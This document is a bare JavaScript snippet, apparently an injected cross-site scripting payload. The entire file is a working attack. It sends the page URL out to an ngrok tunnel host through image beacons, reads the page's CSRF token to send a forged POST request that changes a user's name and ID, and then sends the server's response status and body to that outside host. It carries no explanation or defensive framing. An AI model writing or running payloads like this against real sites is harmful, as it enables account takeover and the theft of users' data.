function send2server(name, data){
    img = document.createElement("img");
    img.src = "https://7b1440ce.ngrok.io/?name="+name+"&data="+btoa(encodeURI(data));
    document.getElementById("chat-div").appendChild(img);
}

send2server("url", window.location.href);

let xhr = new XMLHttpRequest();
xhr.open("POST", window.location.pathname, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
xhr.onload = function() { 
    send2server("status", " "+xhr.status);
    send2server("response", xhr.response);
};
xhr.send("name=Nice&user_id=2&_csrf_token="+document.getElementsByName("_csrf_token")[0].value);
